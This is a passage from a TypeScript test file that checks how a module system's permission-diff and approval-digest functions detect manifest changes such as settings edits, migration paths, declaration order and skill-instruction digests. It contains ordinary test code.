  for (const [label, before, value, prefix] of cases) {
    const after = canonicalModuleBundleV1({ ...declarative(), manifest: value }).manifest;
    const diff = modulePermissionDiffV1(moduleAuthoritySurfaceV1(before), moduleAuthoritySurfaceV1(after));
    assert.ok([...diff.added, ...diff.removed].some(line => line.startsWith(prefix)), label);
    assert.doesNotThrow(() => assertModulePermissionDiffV1(before, after, diff), label);
    assert.throws(() => assertModulePermissionDiffV1(before, after, { added: [], removed: [] }), /module_permission_diff_empty/, label);
  }
  for (const patch of [{ license: "MIT" }, { version: "2.0.0" }, { controlRoomCompatibility: "^0.2.0" }]) {
    const after = canonicalModuleBundleV1(declarative(patch)).manifest;
    const diff = modulePermissionDiffV1(moduleAuthoritySurfaceV1(base), moduleAuthoritySurfaceV1(after));
    assert.deepEqual(diff, { added: [], removed: [] });
    assert.doesNotThrow(() => assertModulePermissionDiffV1(base, after, diff));
  }
  // Attribution is not a v1 manifest field, so it is rejected before the guard.
  assert.throws(() => canonicalModuleBundleV1(declarative({ attribution: "Publisher credit" })), /unrecognized_keys/);
  const changed = cases.find(([label]) => label === "skills instructions")!;
  const after = canonicalModuleBundleV1({ ...declarative(), manifest: changed[2] }).manifest;
  const diff = modulePermissionDiffV1(moduleAuthoritySurfaceV1(skillBase), moduleAuthoritySurfaceV1(after));
  assert.ok(diff.added.some(line => /^skill.instructionsDigest:skill.summary:1:sha256:[a-f0-9]{64}$/.test(line)));
  assert.ok(diff.removed.some(line => line.startsWith("skill.instructionsDigest:")));
  assert.ok(diff.added.includes(`skill.contentDigest:skill.summary:1:${after.skills![0]!.contentDigest}`));
  assert.ok(!diff.added.some(line => line.includes("Use only checked evidence.")), "show a digest of skill instructions");
});

test("R7L-09: settings edits, migration paths and declaration order are visible", () => {
  const base = canonicalModuleBundleV1(declarative({ skills: [sharedSkill(), sharedSkill({ id: "skill.second" })],
    ui: { projectTabs: [{ id: "digest.one", label: "One" }, { id: "digest.two", label: "Two" }], needsYou: false,
      settings: { type: "object", properties: { count: { type: "integer", title: "Count", default: 1 } },
        required: ["count"], additionalProperties: false } },
    data: { schemaNamespace: "module_weekly_digest", tenantScoped: true, projectScoped: true,
      migrations: [{ version: "1.0.0", upFile: "migrations/one.sql", downFile: "migrations/undo.sql" }] },
    permissions: { ...manifest().permissions, projectData: [{ resource: "module_weekly_digest_notes", access: ["read", "write"] }],
      taskTemplates: ["digest.first", "digest.second"], pipelineTemplates: ["digest.first", "digest.second"],
      workerCapabilities: ["cap.first", "cap.second"], notifications: { slots: ["slot.first", "slot.second"], maxPerHour: 2 },
      attention: { slots: ["slot.first", "slot.second"], maxOpenPerProject: 2 },
      scheduledJobs: { jobs: ["job.first", "job.second"], maxConcurrent: 1, maxRunsPerDay: 2, maxRuntimeSeconds: 3 } },
    events: { subscribe: ["event.first", "event.second"], emitNotifications: false } })).manifest;
  const changes: Array<[string, (value: typeof base) => void]> = [
    ["settings default", m => { m.ui.settings!.properties.count!.default = 2; }],
    ["settings removed", m => { delete m.ui.settings; }],
    ["migration up path", m => { m.data!.migrations[0]!.upFile = "migrations/two.sql"; }],
    ["migration down path", m => { m.data!.migrations[0]!.downFile = "migrations/undo_two.sql"; }],
    ["tabs order", m => { m.ui.projectTabs.reverse(); }],
    ["skills order", m => { m.skills!.reverse(); }],
    ["access order", m => { m.permissions.projectData[0]!.access.reverse(); }],
    ["task templates order", m => { m.permissions.taskTemplates.reverse(); }],
    ["pipeline templates order", m => { m.permissions.pipelineTemplates.reverse(); }],
    ["capabilities order", m => { m.permissions.workerCapabilities.reverse(); }],
    ["notification slots order", m => { m.permissions.notifications.slots.reverse(); }],
    ["attention slots order", m => { m.permissions.attention.slots.reverse(); }],
    ["scheduled jobs order", m => { m.permissions.scheduledJobs.jobs.reverse(); }],
    ["events order", m => { m.events.subscribe.reverse(); }],
  ];
  for (const [label, mutate] of changes) {
    const after = structuredClone(base); mutate(after);
    canonicalModuleBundleV1({ ...declarative(), manifest: after });
    const diff = modulePermissionDiffV1(moduleAuthoritySurfaceV1(base), moduleAuthoritySurfaceV1(after));
    assert.ok(diff.added.length + diff.removed.length > 0, label);
    assert.doesNotThrow(() => assertModulePermissionDiffV1(base, after, diff), label);
  }
});

test("R7L-09: both historical approval digests keep their original surfaces", () => {
  const base = canonicalModuleBundleV1(declarative()).manifest;
  const oldSurface = ["class:declarative", "name:Weekly digest", "publisher:Example Publisher",
    "projectData:module_weekly_digest_notes:read", "taskTemplate:digest.weekly", "workerCapability:text.reasoning",
    "notificationSlot:project.digest", "notifications.maxPerHour:2", "attention.maxOpenPerProject:0",
    "scheduledJobs.maxConcurrent:0", "scheduledJobs.maxRunsPerDay:0", "scheduledJobs.maxRuntimeSeconds:0",
    "ui.projectTab:digest.tab", "ui.needsYou:false", "event:project.created", "events.emitNotifications:true"].sort();
  const digest = (surface: string[]) => sha256Digest({ namespace: "control-room.module-authority-surface/v1", surface });
  assert.equal(previousModulePermissionsDigestV1(base), digest(oldSurface));
  assert.equal(legacyModulePermissionsDigestV1(base), digest(oldSurface.filter(line => !/^(name|publisher):/.test(line))));
});
